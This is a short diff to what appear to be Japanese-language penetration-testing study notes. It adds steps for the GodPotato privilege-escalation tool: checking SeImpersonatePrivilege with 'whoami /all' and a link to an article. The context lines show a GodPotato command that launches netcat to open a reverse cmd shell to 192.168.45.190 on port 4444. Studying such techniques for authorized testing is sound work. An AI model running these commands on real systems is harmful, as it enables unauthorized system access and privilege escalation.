@@ -670,6 +670,9 @@ kali 側
 python3 -m http.server 8000
 ```
 ### GodPotato
+***SeImpersonatePrivilege***の値を確認  
+***whoami /all***コマンドで  
+https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalation-techniques-400b88403a71
 ```
 GodPotato-NET2.exe -cmd "nc_win.exe 192.168.45.190 4444 -e cmd"
 ```
